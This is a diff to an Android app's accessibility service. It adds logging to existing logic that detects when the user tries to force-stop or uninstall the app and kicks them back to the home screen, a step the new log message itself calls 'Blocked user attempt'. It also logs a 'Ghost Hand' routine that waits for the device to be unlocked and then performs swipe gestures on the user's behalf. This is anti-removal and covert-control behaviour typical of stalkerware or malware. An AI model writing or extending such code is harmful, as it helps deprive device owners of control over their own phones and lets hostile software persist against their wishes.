@@ -68,6 +68,7 @@ class MyAccessibilityService : AccessibilityService() {
                 val isDanger = dangerKeywords.any { content.contains(it, ignoreCase = true) }
 
                 if (isTargetingUs && isDanger) {
+                    DebugLogger.log("AEGIS", "Blocked user attempt to Force Stop/Uninstall!")
                     performGlobalAction(GLOBAL_ACTION_BACK)
                     performGlobalAction(GLOBAL_ACTION_HOME)
                     return
@@ -130,9 +131,13 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun engageGhostHand() {
+        DebugLogger.log("GHOST", "Engaging Ghost Hand for Data Recovery...")
         isGhostActive = true
         val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
-        if (km.isKeyguardLocked) return
+        if (km.isKeyguardLocked) {
+            DebugLogger.log("GHOST", "Device Locked. Waiting for user...")
+            return
+        }
         performSwipeDown()
     }
 
